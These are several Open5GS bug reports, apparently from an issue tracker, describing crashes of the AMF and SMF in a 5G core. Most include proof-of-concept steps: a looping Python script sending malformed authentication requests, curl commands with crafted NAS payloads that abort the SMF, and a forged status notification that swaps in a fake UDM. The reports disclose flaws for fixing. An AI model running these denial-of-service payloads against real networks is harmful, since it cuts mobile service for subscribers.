items.title: [Bug]: AMF crashes with SIGABRT at ogs-fsm.c — NULL FSM state transition from NF instance FSM inconsistency triggered by malformed SBI authentication request`

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

The AMF crashes with SIGABRT when a malformed SBI authentication request (null byte injection + path traversal in JSON keys) triggers the AUSF → AMF authentication flow. The AMF's outer FSM dispatches the event to an NF instance handler whose state has been corrupted/invalidated, causing `sm->state` to be set to NULL. After the handler returns, `ogs_fsm_dispatch()` calls `fsm_change(old, new=NULL, e)`, triggering `ogs_assert(newstate)` at `ogs-fsm.c`.

**Environment**
- Docker deployment, bridge network 172.23.0.0/16
- AMF at 172.23.0.20:7777, AUSF at 172.23.0.50:7777, NRF/UDM/UDR/SMF present
- AMF compiled from Open5GS v2.7.7 with gcov coverage flags
- Crash requires pre-existing NF registration state (containers running for extended period)

**Reproduction steps:**

1. Start Open5GS containers with all NFs (NRF, AMF, SMF, AUSF, UDR, UDM)
2. Allow NFs to register and establish SBI connections (~2 minutes)
3. Send crafted POST requests to the AUSF UE authentication endpoint:
   ```python
   import http.client, json, time

   host, port = "172.23.0.50", 7777
   payloads = [
       json.dumps({
           'supiOrSuci': 'imsi-901700000000001',
           'servingNetworkName': '5G:mnc070.mcc901.3gppnetwork.org',
           'authType': '5G_AKA',
           '\x00null_byte_371': 'injected',
           '../../../etc/passwd': '[REDACTED_LOG_CREDENTIAL]'
       }),
       json.dumps({
           'supiOrSuci': 999999,
           'servingNetworkName': ['not', 'a', 'string'],
           'authType': None
       }),
   ]

   for i in range(100):
       for body in payloads:
           try:
               conn = http.client.HTTPConnection(host, port, timeout=5)
               conn.request('POST', '/nausf-auth/v1/ue-authentications',
                            body=body,
                            headers={'Content-Type': 'application/json'})
               resp = conn.getresponse()
               if resp.status >= 500:
                   print(f"Iteration {i}: HTTP {resp.status}")
           except Exception as e:
               print(f"Iteration {i}: Connection error — AMF may have crashed")
               break
   ```
4. The AMF exits with SIGABRT after the NF instance FSM state becomes inconsistent.

**12-Hour Experiment Confirmation:**
```
AMF crash events:
  - Configuration FSM=ON,  Cross-Protocol=OFF: 245+ crashes (Worker w2)
  - Configuration FSM=OFF, Cross-Protocol=OFF: 200+ crashes (Worker w2)
Total confirmed: 700+ across the 12-hour campaign
Crash severity: MEDIUM (CVSS 7.5 / CWE-617 Reachable Assertion)
All crashes at the same location: ogs-fsm.c assert(newstate)
```

---

## Resolved Backtrace

Three independent crash events from the 12-hour experiment (13:54, 14:34, 19:09) all share an identical backtrace pattern. The addresses were resolved using `gdb` against the debug-symbol-bearing build tree binary:

```
FATAL: fsm_change: Assertion `newstate' failed. (../lib/core/ogs-fsm.c)
FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c)

#0  libogscore.so.2(+0x2fb71)            ogs_abort / fsm_change assert handler
#1  libogscore.so.2(ogs_fsm_dispatch+0x18b)  fsm_change(oldstate, newstate=NULL, e) ← CRASH
#2  open5gs-amfd(+0x5bf39)               amf_state_operational() at amf-sm.c
                                           → ogs_fsm_dispatch(&nf_instance->sm, e)
#3  libogscore.so.2(ogs_fsm_dispatch+0x14f)  (*tmp)(sm, e) — calls state handler
#4  open5gs-amfd(+0x15ea7)               amf_main() at init.c — event loop entry
#5  libogscore.so.2(+0x1cc5f)            thread worker function
#6  libc.so.6(+0x94ac3)                  thread start
#7  libc.so.6(clone+0x44)                clone syscall
```

```
Resolution via gdb:
  open5gs-amfd+0x5bf39 → amf_state_operational+8579  (../src/amf/amf-sm.c)
  open5gs-amfd+0x15ea7 → amf_main+588                 (../src/amf/init.c)
```

### Logs

```shell
$ docker logs fuzzing-open5gs-amf --tail 10

[core] FATAL: fsm_change: Assertion `newstate' failed. (../lib/core/ogs-fsm.c)
[core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c)
/usr/lib/x86_64-linux-gnu/libogscore.so.2(+0x2fb71)
/usr/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x18b)
/usr/bin/open5gs-amfd(+0x5bf39)
/usr/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x14f)
/usr/bin/open5gs-amfd(+0x15ea7)
/usr/lib/x86_64-linux-gnu/libogscore.so.2(+0x1cc5f)
/usr/lib/x86_64-linux-gnu/libc.so.6(+0x94ac3)
/usr/lib/x86_64-linux-gnu/libc.so.6(clone+0x44)
Open5GS daemon v2.7.7

[app] INFO: Configuration: '/etc/open5gs/amf.yaml'
[app] INFO: File Logging: '/var/log/open5gs/amf.log'
... (AMF restarts automatically)
```

### Expected behaviour

1. NF instance FSM state handlers should never set `sm->state` to NULL — invalid state transitions should return an error code.
2. `ogs_fsm_dispatch()` should guard against NULL state AFTER the handler returns, not just before:
   ```c
   if (sm->state != tmp) {
       if (sm->state == NULL) {
           ogs_error("State handler set state to NULL");
           return;  // Don't crash
       }
       fsm_change(fsm, tmp, sm->state, e);
   }
   ```
3. The AUSF → AMF authentication path should validate JSON fields before forwarding them to the NF instance FSM.


### Observed Behaviour

1. Malformed SBI authentication requests (null byte + path traversal in JSON keys) are accepted by the AUSF and forwarded to the AMF.
2. The AMF's NF instance FSM handler processes the malformed data and corrupts its own state.
3. `ogs_fsm_dispatch()` returns from the handler, detects the state change, and calls `fsm_change()` with the corrupted (NULL) state.
4. `ogs_assert(newstate)` at `ogs-fsm.c` fires → SIGABRT → AMF process terminates.
5. All in-progress UE sessions are lost. The AMF auto-restarts, only to be crashed again by subsequent malformed requests.

items.title: [Bug]: SMF crash in ogs_hash_get_debug: Assertion `klen' failed after two SBI requests

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

The SMF process crashes with a fatal assertion failure in `ogs_hash_get_debug()` when two SBI requests are sent in sequence to the SMF SBI endpoint.

Crash location:

```c
lib/core/ogs-hash.c:316
OGS_ASSERT(klen);
```

The assertion failure indicates that `ogs_hash_get()` is called with a zero-length key at some point after the first request is processed.

### Minimal reproduction sequence

The following tests confirmed that both messages are necessary:

```text
smf_ctx_create_wrong_plmn alone -> SMF alive
second SBI request alone -> SMF alive
both in sequence -> CRASH / connection reset
```

#### Message 1 — trigger request

```http
POST /nsmf-pdusession/v1/sm-contexts HTTP/2
Host: 127.0.0.4:7777
Content-Type: application/json
```

```json
{
  "supi": "imsi-001010000000001",
  "dnn": "internet",
  "sNssai": { "sst": 1, "sd": "010203" },
  "servingPlmnId": "99970",
  "anType": "3GPP_ACCESS",
  "ratType": "NR",
  "pduSessionId": 1
}
```

After this first request, the HTTP/2 connection remains open and the SMF process is still alive.

#### Message 2 — second SBI request to the same endpoint

```http
GET /nnrf-disc/v1/nf-instances?target-nf-type=NRF&requester-nf-type=AMF HTTP/2
```

This request is sent to the SMF SBI port as a second SBI request to trigger further processing. It is not a functionally valid SMF request.

Observed result:

```text
Message 1 -> HTTP/2 connection remains open, SMF alive
Message 2 -> connection reset, SMF process exits
```

### Crash log

```text
[core] FATAL: ogs_hash_get_debug: Assertion `klen' failed.
(../lib/core/ogs-hash.c:316)

[core] FATAL: backtrace() returned 12 addresses
libogscore.so.2(ogs_abort+0xbb)
libogscore.so.2(ogs_hash_get_debug+0x153)
open5gs-smfd(+0x2bff76)
```

The same `open5gs-smfd(+0x2bff76)` offset was observed across multiple SMF restart cycles.

Before each crash, the SMF logs a failed NRF connection attempt:

```text
[sbi] WARNING: Couldn't connect to server (7): Failed to connect to
127.0.0.200 port 7777 after 0 ms
[sbi] WARNING: ogs_sbi_client_handler() failed [-1]
```

### Root cause hypothesis

The crash appears to occur in an asynchronous SBI processing path after the first request has created or referenced partially initialized SMF state. Since the fatal assertion shows that `ogs_hash_get()` is called with `klen == 0`, the SMF session lookup path may be using an empty or uninitialized key after the failed `CreateSMContext` path.

A fully symbolized backtrace would be needed to confirm the exact caller and the specific field used as the empty key.

### Suggested fix

A defensive fix would be to ensure that no SMF session lookup calls `ogs_hash_get()` with an empty key.

Before calling:

```c
ogs_hash_get(hash, key, strlen(key));
```

the relevant lookup path should reject or skip entries where:

```c
key == NULL || strlen(key) == 0
```

A more complete fix should also ensure that, when `CreateSMContext` processing fails because of an invalid or mismatched PLMN, any partially initialized SM context is either fully cleaned up or marked invalid before asynchronous SBI callbacks or later SBI processing can access it.

### Impact

```text
Severity: deterministic SMF process crash / DoS through its SBI endpoint
Affected NF: SMF / open5gs-smfd
Crash type: ogs_assert / SIGABRT
Messages needed: 2, ordered sequence
Recovery: SMF must be restarted
Auth required: none in the tested configuration
```

### Environment

```text
Open5GS version: v2.7.7
Build: local build from source
OS: Ubuntu x86_64
```


### Logs

```shell

```

### Expected behaviour

The SMF should reject the invalid CreateSMContext request or the following SBI request gracefully without aborting the process. A malformed or invalid request sequence should not lead to an assertion failure in ogs_hash_get_debug().

### Observed Behaviour

The SMF process terminates with:

[core] FATAL: ogs_hash_get_debug: Assertion `klen' failed.
(../lib/core/ogs-hash.c:316)

The crash is deterministic and requires the two requests in sequence. Each request alone leaves the SMF process alive.

### eNodeB/gNodeB

N/A

### UE Models and versions

N/A

items.title: [Bug]: SMF crash on `POST /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify` with invalid bitrate unit in `n1SmMsg` QoS flow descriptions

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce


### Description

SMF crashes when a `PDU Session Modification Request` delivered through
`SmContextUpdateData.n1SmMsg` carries a syntactically valid
`requested_qos_flow_descriptions` IE whose bitrate parameter uses an invalid
NAS bitrate unit.

The parser accepts the 3-byte bitrate structure without validating the unit in
`ogs_nas_parse_qos_flow_descriptions()`. Later
`gsm_handle_pdu_session_modification_qos_flow_descriptions()` calls
`ogs_nas_bitrate_to_uint64()` on the attacker-controlled bitrate:

```c
case OGS_NAX_QOS_FLOW_PARAMETER_ID_GFBR_UPLINK:
    qos_flow->qos.gbr.uplink = ogs_nas_bitrate_to_uint64(
            &qos_flow_description[i].param[j].br);
    break;
```

`ogs_nas_bitrate_to_uint64()` fatally aborts on unknown units:

```c
ogs_fatal("Unknown unit [%d]", nas_bitrate->unit);
ogs_assert_if_reached();
```

This issue is distinct from the previously confirmed
`nsmf-pdusession-pdu-sessions-createddata-invalid-qosflowdescription-assert-abort`
report. That older issue is on the H-SMF `201 Created` callback path; this one
is on the AMF-facing `sm-contexts/{ref}/modify` N1 business path.

### Steps to reproduce

1. Start the Docker lab and ensure `smf` and `smf-audit-ue` are running.
2. Resolve the current SMF container IP and an active `smContextRef`:

```bash
SMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smf)
docker restart smf-audit-ue >/dev/null
sleep 3

REF=$(
  for i in $(seq 1 30); do
    code=$(curl --http2-prior-knowledge -m 5 -sS -o /tmp/probe.body -w '%{http_code}' \
      -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$i/modify" \
      -H 'Content-Type: application/json' \
      --data '{"hoState":"COMPLETED"}')
    if [ "$code" != 404 ]; then
      echo "$i"
      break
    fi
  done
)
echo "SMF_IP=$SMF_IP REF=$REF"
```

3. Prepare a multipart `SmContextUpdateData` with only `n1SmMsg`, using the
malicious NAS payload below. The payload is a `PDU Session Modification
Request` whose `requested_qos_flow_descriptions` contains a GFBR uplink
parameter with bitrate `unit=0`, which is not a valid NAS bitrate unit:

```bash
python3 - <<'PY'
from pathlib import Path
import json

boundary = 'REQBOUNDARY'
body = {'n1SmMsg': {'contentId': '5gnas-sm'}}
n1 = bytes.fromhex('2e0101c97900080160410203000001')

parts = []
parts.append(
    (f'--{boundary}\r\nContent-Type: application/json\r\n\r\n'.encode()) +
    json.dumps(body, separators=(',', ':')).encode() + b'\r\n'
)
parts.append(
    (f'--{boundary}\r\nContent-Id: 5gnas-sm\r\n'
     f'Content-Type: application/vnd.3gpp.5gnas\r\n\r\n'.encode()) +
    n1 + b'\r\n'
)
parts.append(f'--{boundary}--\r\n'.encode())

Path('/tmp/smctx_modify_invalid_bitrate.multipart').write_bytes(b''.join(parts))
PY
```

4. Send the request:

```bash
curl --http2-prior-knowledge -m 10 -sS -i \
  -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$REF/modify" \
  -H 'Content-Type: multipart/related; boundary=REQBOUNDARY' \
  --data-binary @/tmp/smctx_modify_invalid_bitrate.multipart
```

5. Check the SMF process state and logs:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' smf
docker logs --tail 120 smf
```

### Logs

```shell
Client side:


curl: (92) HTTP/2 stream 1 was not closed cleanly


SMF state:


exited 139 2026-04-11T07:52:16.722895347Z


SMF log:


04/11 07:52:16.598: [nas] FATAL: Unknown unit [0] (../lib/nas/common/types.c:502)
04/11 07:52:16.598: [nas] FATAL: ogs_nas_bitrate_to_uint64: should not be reached. (../lib/nas/common/types.c:503)
```

### Expected behaviour

SMF should reject invalid NAS bitrate units in the `n1SmMsg`
`PDU Session Modification Request` and fail only that transaction.

### Observed Behaviour

The crafted `n1SmMsg` aborts the entire SMF process before any HTTP response is
completed, leaving the client with a transport error and the SMF container
exiting with code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Description

AMF aborts during a real UE registration flow when the `Nudm_SDM` `am-data`
response contains too many `nssai.defaultSingleNssais` entries.

This path is UE-driven: the crash is only reached after an external UE starts a
normal 5G registration procedure and AMF performs:

```text
PUT /nudm-uecm/v1/{supi}/registrations/amf-3gpp-access
GET /nudm-sdm/v2/{supi}/am-data
GET /nudm-sdm/v2/{supi}/smf-select-data
GET /nudm-sdm/v2/{supi}/ue-context-in-smf-data
POST /nudm-sdm/v2/{supi}/sdm-subscriptions
```

inside the registration state machine.

The root cause starts in `amf_nudm_sdm_handle_provisioned()`:

```c
DefaultSingleNssaiList = NSSAI->default_single_nssais;
if (DefaultSingleNssaiList) {
    OpenAPI_list_for_each(DefaultSingleNssaiList, node) {
        ogs_slice_data_t *slice = &amf_ue->slice[amf_ue->num_of_slice];
        ...
        amf_ue->num_of_slice++;
    }
}
```

at `../src/amf/nudm-handler.c:95-116`.

The destination array has fixed size `OGS_MAX_NUM_OF_SLICE == 8`:

```c
ogs_slice_data_t slice[OGS_MAX_NUM_OF_SLICE];
```

at `../src/amf/context.h:523` with the macro defined in
`../lib/proto/types.h:137`.

There is no bounds check while copying the attacker-controlled
`defaultSingleNssais` entries into `amf_ue->slice[]`. In the confirmed run, the
memory corruption reached the next stage of the registration flow and tripped a
defensive assertion in `gmm_state_registered`:

```c
ogs_assert(amf_ue->num_of_slice <= OGS_MAX_NUM_OF_SLICE);
```

This is not a duplicate of the existing AMF reports under `report/amf/`. It is
a different entry chain, different trust boundary, and different crash site
from the `namf-*`, `nnrf-*`, and newly confirmed `gpsis` overflow issue.

### Root cause

- Entry chain:
  external UE registration
  -> AMF `PUT /nudm-uecm/.../amf-3gpp-access`
  -> AMF `GET /nudm-sdm/v2/{supi}/am-data`
  -> `amf_nudm_sdm_handle_provisioned()`
  -> later registration-state validation
- Root-cause write site:
  `../src/amf/nudm-handler.c:95-116`
- Crash site:
  `gmm_state_registered: Assertion 'amf_ue->num_of_slice <= OGS_MAX_NUM_OF_SLICE' failed`
- Root cause family:
  fixed-size array overflow / state corruption followed by assertion abort
- Controlling field:
  `AccessAndMobilitySubscriptionData.nssai.defaultSingleNssais`

### Steps to Reproduce

1. Start the Open5GS Docker lab and ensure these containers are running:

```bash
docker start db ausf udm udr pcf smf upf amf nssf
```

2. Confirm the subscriber exists in MongoDB. In my live run, the existing test
subscriber was:

```text
IMSI: 001011234567891
```

3. Start a real gNB and UE with the bundled UERANSIM configs:

```bash
docker run --rm -d --name amf-audit-gnb --network open5gs \
  --network-alias gnb.ueransim.org \
  -v /home/ubuntu/docker-open5gs/configs/internal/ueransim/gnb.yaml:/ueransim/config/gnb.yaml:ro \
  free5gc/ueransim:latest /ueransim/nr-gnb -c /ueransim/config/gnb.yaml

docker run --rm -d --name amf-audit-ue --network open5gs \
  --network-alias ue.ueransim.org \
  --cap-add NET_ADMIN --device /dev/net/tun:/dev/net/tun \
  -v /home/ubuntu/docker-open5gs/configs/internal/ueransim/ue.yaml:/ueransim/config/ue.yaml:ro \
  free5gc/ueransim:latest /ueransim/nr-ue -c /ueransim/config/ue.yaml -r
```

4. Start the fake UDM helper on the host:

```bash
node /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.js
```

5. Replace the real UDM in AMF's local cache with the fake UDM:

```bash
AMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' amf)

curl --http2-prior-knowledge -sS -i -m 8 \
  -X POST "http://$AMF_IP/nnrf-nfm/v1/nf-status-notify" \
  -H 'content-type: application/json' \
  --data '{"event":"NF_DEREGISTERED","nfInstanceUri":"http://nrf.open5gs.org/nnrf-nfm/v1/nf-instances/4568f3be-3644-41f1-bff0-3b335fd843b5"}'

curl --http2-prior-knowledge -sS -i -m 8 \
  -X POST "http://$AMF_IP/nnrf-nfm/v1/nf-status-notify" \
  -H 'content-type: application/json' \
  --data '{"event":"NF_REGISTERED","nfInstanceUri":"http://10.33.33.1:18083/nnrf-nfm/v1/nf-instances/fake-udm-amf","nfProfile":{"nfInstanceId":"fake-udm-amf","nfType":"UDM","nfStatus":"REGISTERED","fqdn":"fake-udm-amf.local","ipv4Addresses":["10.33.33.1"],"allowedNfTypes":["SCP","AMF","SMF","AUSF"],"priority":0,"capacity":100,"load":0,"nfServices":[{"serviceInstanceId":"fake-udm-ueau","serviceName":"nudm-ueau","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AUSF"],"priority":0,"capacity":100,"load":0},{"serviceInstanceId":"fake-udm-uecm","serviceName":"nudm-uecm","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AMF","SMF"],"priority":0,"capacity":100,"load":0},{"serviceInstanceId":"fake-udm-sdm","serviceName":"nudm-sdm","versions":[{"apiVersionInUri":"v2","apiFullVersion":"2.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AMF","SMF"],"priority":0,"capacity":100,"load":0}]}}'
```

6. Control experiment: configure the fake UDM for a single normal
`defaultSingleNssai`, then restart `gnb` and `ue` and wait for successful
registration:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.mode
docker restart amf-audit-gnb amf-audit-ue
docker logs --tail 60 amf-audit-ue
docker inspect -f '{{.State.Status}} {{.State.ExitCode}}' amf
```

In the confirmed control run, the fake UDM received the full `am-data`,
`smf-select-data`, `ue-context-in-smf-data`, and `sdm-subscriptions` sequence,
and the UE completed registration plus PDU session establishment.

7. Malicious experiment: change only the fake UDM mode so `am-data` returns
`32` identical `defaultSingleNssais`, then restart `gnb` and `ue` again:

```bash
printf 'am-data-slice-overflow\n' > /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.mode
docker restart amf-audit-gnb amf-audit-ue

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' amf
docker logs --tail 120 amf
```

### Logs

Control UE result:

```text
Initial Registration is successful
PDU Session establishment is successful PSI[1]
```

Control AMF state:

```text
running 0
```

Malicious evidence from the fake UDM:

```text
2026-04-12T08:16:58.089Z PUT /nudm-uecm/v1/imsi-001011234567891/registrations/amf-3gpp-access mode=am-data-slice-overflow body={...}
2026-04-12T08:16:58.092Z GET /nudm-sdm/v2/imsi-001011234567891/am-data?... mode=am-data-slice-overflow body=<empty>
2026-04-12T08:16:58.093Z GET /nudm-sdm/v2/imsi-001011234567891/smf-select-data?... mode=am-data-slice-overflow body=<empty>
2026-04-12T08:16:58.094Z GET /nudm-sdm/v2/imsi-001011234567891/ue-context-in-smf-data?... mode=am-data-slice-overflow body=<empty>
2026-04-12T08:16:58.095Z POST /nudm-sdm/v2/imsi-001011234567891/sdm-subscriptions mode=am-data-slice-overflow body={...}
```



items.title: [Bug]: SMF crash on `POST /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify` with empty packet-filter content in `n1SmMsg` QoS rules

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce


### Description

SMF crashes when a `PDU Session Modification Request` delivered through
`SmContextUpdateData.n1SmMsg` carries a syntactically valid
`requested_qos_rules` IE whose packet filter list contains one packet filter
with `content.length = 0`.

`ogs_nas_parse_qos_rules()` accepts the rule and leaves
`rule->pf[i].content.num_of_component = 0`. Later
`gsm_handle_pdu_session_modification_qos_rules()` allocates a packet filter and
asserts that reconfiguration produced at least one component:

```c
pf = smf_pf_add(qos_flow);
ogs_assert(pf);

ogs_assert(reconfigure_packet_filter(pf, &qos_rule[i], i) > 0);
```

For an empty packet-filter content, `reconfigure_packet_filter()` returns `0`,
so the assertion aborts the SMF process.

This issue is distinct from the `invalid bitrate unit` bug above: that one is
in QoS flow description bitrate conversion, while this one is an assert on the
QoS rule packet-filter business logic.

### Steps to reproduce

1. Start the Docker lab and ensure `smf` and `smf-audit-ue` are running.
2. Resolve the current SMF container IP and an active `smContextRef`:

```bash
SMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smf)
docker restart smf-audit-ue >/dev/null
sleep 3

REF=$(
  for i in $(seq 1 30); do
    code=$(curl --http2-prior-knowledge -m 5 -sS -o /tmp/probe.body -w '%{http_code}' \
      -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$i/modify" \
      -H 'Content-Type: application/json' \
      --data '{"hoState":"COMPLETED"}')
    if [ "$code" != 404 ]; then
      echo "$i"
      break
    fi
  done
)
echo "SMF_IP=$SMF_IP REF=$REF"
```

3. Prepare a multipart `SmContextUpdateData` with only `n1SmMsg`, using the
malicious NAS payload below. The payload is a `PDU Session Modification
Request` whose `requested_qos_rules` uses
`MODIFY_EXISTING_QOS_RULE_AND_ADD_PACKET_FILTERS`, but the only packet filter
has `content.length = 0`:

```bash
python3 - <<'PY'
from pathlib import Path
import json

boundary = 'REQBOUNDARY'
body = {'n1SmMsg': {'contentId': '5gnas-sm'}}
n1 = bytes.fromhex('2e0101c97a00080100056120000f01')

parts = []
parts.append(
    (f'--{boundary}\r\nContent-Type: application/json\r\n\r\n'.encode()) +
    json.dumps(body, separators=(',', ':')).encode() + b'\r\n'
)
parts.append(
    (f'--{boundary}\r\nContent-Id: 5gnas-sm\r\n'
     f'Content-Type: application/vnd.3gpp.5gnas\r\n\r\n'.encode()) +
    n1 + b'\r\n'
)
parts.append(f'--{boundary}--\r\n'.encode())

Path('/tmp/smctx_modify_empty_pf.multipart').write_bytes(b''.join(parts))
PY
```

4. Send the request:

```bash
curl --http2-prior-knowledge -m 10 -sS -i \
  -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$REF/modify" \
  -H 'Content-Type: multipart/related; boundary=REQBOUNDARY' \
  --data-binary @/tmp/smctx_modify_empty_pf.multipart
```

5. Check the SMF process state and logs:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' smf
docker logs --tail 120 smf
```

### Logs

```shell
Client side:


curl: (56) Recv failure: Connection reset by peer


SMF state:


exited 139 2026-04-11T07:54:37.832480109Z


SMF log:


04/11 07:54:37.740: [gsm] FATAL: gsm_handle_pdu_session_modification_qos_rules: Assertion `reconfigure_packet_filter(pf, &qos_rule[i], i) > 0' failed. (../src/smf/gsm-handler.c:274)
```

### Expected behaviour

SMF should reject QoS rules whose packet filter content is empty and return a
normal protocol error for that request.

### Observed Behaviour

The crafted `n1SmMsg` aborts the entire SMF process before any HTTP response is
completed, resetting the client connection and terminating the SMF container
with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: SMF crash on `POST /nsmf-pdusession/v1/vsmf-pdu-session/{smContextRef}/modify` with missing `qosFlowProfile`

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

SMF crashes when a `VsmfUpdateData` request to
`POST /nsmf-pdusession/v1/vsmf-pdu-session/{smContextRef}/modify` contains a
`qosFlowsAddModRequestList[*]` item with `qfi` and `qosFlowDescription` but no
`qosFlowProfile`.

`smf_nsmf_handle_update_data_in_vsmf()` accepts such an item through the first
check and then immediately dereferences the missing `qosFlowProfile` while
formatting the validation error log:

```c
src = node->data;
if (!src ||
    !src->qfi ||
    !(src->qos_flow_description || src->qos_flow_profile)) {
    ...
}

qosFlowProfile = src->qos_flow_profile;
if (!qosFlowProfile || ...) {
    ogs_error("[%s:%d] Invalid qosFlowProfile [%d:%p:%d]",
            smf_ue->supi, sess->psi,
            qosFlowProfile->_5qi,
            qosFlowProfile->arp,
            qosFlowProfile->arp ?
                qosFlowProfile->arp->priority_level : 0);
```

That null dereference aborts the SMF process before it can return a normal
error response.

This issue is not a duplicate of the existing `sm-policy-notify` callback
reports. It affects a different SBI route and a different HR-related business
handler.

As a control, supplying a valid `qosFlowProfile` caused execution to progress
further into the same handler and later abort on a different assertion
(`param.n2smbuf`), showing that the missing-profile case crashes earlier.

### Steps to reproduce

1. Start the Open5GS Docker lab and establish a real SMF session using the
existing UERANSIM containers:

```bash
docker restart smf-audit-ue
docker logs --tail 30 smf-audit-ue
```

Wait until the UE log shows:

```text
PDU Session establishment is successful PSI[1]
```

2. Identify the active `smContextRef`. In this run it was `1`:

```bash
for id in 1 2 3 4 5 6; do
  code=$(curl --http2-prior-knowledge -m 3 -s -o /tmp/out.$$ -w '%{http_code}' \
    -X POST http://10.33.33.10/nsmf-callback/v1/sm-policy-notify/${id}/update \
    -H 'content-type: application/json' \
    --data '{"smPolicyDecision":{}}')
  printf '%s %s\n' "$id" "$code"
done
```

3. Send the forged update with `qosFlowProfile` omitted:

```bash
payload=$(python3 - <<'PY'
import json
body = {
  "requestIndication": "NW_REQ_PDU_SES_MOD",
  "qosFlowsAddModRequestList": [
    {
      "qfi": 1,
      "qosFlowDescription": "permit out ip from 10.0.0.1 1000 to any"
    }
  ]
}
print(json.dumps(body, separators=(",", ":")))
PY
)

curl --http2-prior-knowledge -m 5 -sS -i \
  -X POST http://10.33.33.10/nsmf-pdusession/v1/vsmf-pdu-session/1/modify \
  -H 'content-type: application/json' \
  --data "$payload"
```

4. Check SMF state and logs:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' smf
docker logs --since 2026-04-10T21:01:35Z smf
```

### Logs

```shell
curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream



exited 139 2026-04-10T21:01:42.284384125Z


No application log was emitted for this malformed request before process exit.
```

### Expected behaviour

SMF should reject the malformed `VsmfUpdateData` item with a normal `400` error response.

### Observed Behaviour

The HTTP/2 stream aborts and the SMF process exits with code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE removes ran_ue without deactivating the SMF session, blackholing the UE

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
*Reported by the network engineering team at Research Warrant, from a production 5G SA deployment.*

Follow-up to #4547 / #4566, on the core-side half that #4564 explicitly left open ("a fuller fix ... is left for a follow-up").

When a UE re-registers while the AMF still holds an NG context, `HOLDING_NG_CONTEXT()` (`src/amf/context.h`) orphans the old `ran_ue`, sets `ue_ctx_rel_action = NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE` and starts `t_ng_holding`. When that timer expires, `ngap_handle_ue_context_release_action()` runs:

```c
case NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE:
    ogs_debug("    Action: NG context remove");
    ran_ue_remove(ran_ue);
    break;
```

`src/amf/ngap-handler.c:2067` on `main`.

The RAN context is removed, but **no SBI call is made to the SMF** — no `UpdateSMContext(upCnxState=DEACTIVATED)`, and consequently no PFCP modification. The SMF and UPF keep the PDU session `ACTIVATED`, with a downlink FAR/PDR still pointing at the GTP-U TEID of a RAN context that no longer exists.

The UE is then blackholed: downlink traffic is forwarded to a dead tunnel endpoint.

### Why it does not self-heal

Paging is only ever triggered by an SMF downlink-data-notification, which requires the session to be `DEACTIVATED` and buffering. Because the session stays `ACTIVATED`, the SMF never buffers, never notifies, and the AMF never pages. There is no timer on this state.

In our deployment the only observed recovery is the UE tearing down and re-registering on its own initiative — and when it does, **it is assigned a new IP address**, because the previous PDU session was never released and still holds the old one in the SMF pool. That address change is the clearest external evidence that the session survived the RAN context.

### Reproduction

Trigger the holding path, then let `t_ng_holding` expire without the UE re-establishing:

1. UE registers and establishes a PDU session.
